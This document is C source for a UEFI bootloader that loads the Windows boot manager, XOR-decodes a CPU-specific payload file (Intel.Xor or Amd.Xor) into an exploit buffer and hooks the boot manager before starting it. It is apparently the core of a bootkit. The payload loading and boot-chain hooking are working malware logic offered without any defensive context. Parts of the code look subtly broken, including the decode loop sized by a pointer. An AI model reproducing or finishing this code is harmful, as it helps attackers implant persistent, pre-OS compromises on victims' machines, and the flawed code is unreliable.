#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include "Utils.h"
#include "PeStructs.h"
#include "BootMgfw.h"
#include "Exploit.h"
#include <intrin.h>

#include "FileSystem/FileSystem.h"

const UINT32 _gUefiDriverRevision = 0x200;
extern CHAR8* gEfiCallerBaseName = "Bootloader";

typedef enum {
    Other,
    AMD,
    Intel
} CpuVendor;

CpuVendor GetCPUVendor()
{
    CPUID data = { 0 };
    char vendor[0x20] = { 0 };
    __cpuid((int*)&data, 0);
    *(int*)(vendor) = data.ebx;
    *(int*)(vendor + 4) = data.edx;
    *(int*)(vendor + 8) = data.ecx;

    if (MemCmp(vendor, "GenuineIntel", 12) == 0)
        return Intel;
    if (MemCmp(vendor, "AuthenticAMD", 12) == 0)
        return AMD;

    return Other;
}

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle)
{
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Status = EFI_DEVICE_ERROR;

    EFI_HANDLE BootMgfwHandle = NULL;
    EFI_DEVICE_PATH* BootMgfwPath = NULL;

    UINT32 Index = 0;
    if (EFI_ERROR((Status = RestoreBootMgfw(&Index))))
    {
        Print(L"ERORR: 0\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    if (EFI_ERROR((Status = GetBootMgfwPath(&BootMgfwPath))))
    {
        Print(L"ERORR: 1\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    if (EFI_ERROR((Status = gBS->LoadImage(TRUE, ImageHandle, BootMgfwPath, NULL, 0, &BootMgfwHandle))))
    {
        Print(L"ERORR3: %r\n", Status);
        gBS->Stall(SEC_TO_MS(5));
        return EFI_ABORTED;
    }

    CpuVendor CupType = GetCPUVendor();
    CHAR16* shellName = NULL;
    if (CupType == Intel)
        shellName = L"\\Intel.Xor";
    else if (CupType == AMD)
        shellName = L"\\Amd.Xor";
    else
        return EFI_UNSUPPORTED;

    VOID* buffer = NULL;
    UINTN shellSize = 0;
    if (EFI_ERROR(Status = ReadFile(shellName, &shellSize, buffer)))
    {
        Print(L"ERORR6: %r\n", Status);
        gBS->Stall(SEC_TO_MS(5));
        return EFI_ABORTED;
    }

    UINT8* shellBuffer = buffer;
    for (UINT32 i = 0; i < sizeof(shellBuffer); i++)
        shellBuffer[i] = (UINT8)(shellBuffer[i] ^ ((i + 7 * i + 8) + 4 + i));

    ExpLoad = shellBuffer;

    if (EFI_ERROR((Status = InstallBootMgfwHooks(BootMgfwHandle))))
    {
        Print(L"ERORR: 4\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    gBS->Stall(SEC_TO_MS(10));
    Status = gBS->StartImage(BootMgfwHandle, NULL, NULL);
    if (EFI_ERROR((Status)))
    {
        Print(L"ERORR: 5\n");
        gBS->Stall(SEC_TO_MS(5));
        return EFI_ABORTED;
    }
    return EFI_SUCCESS;
}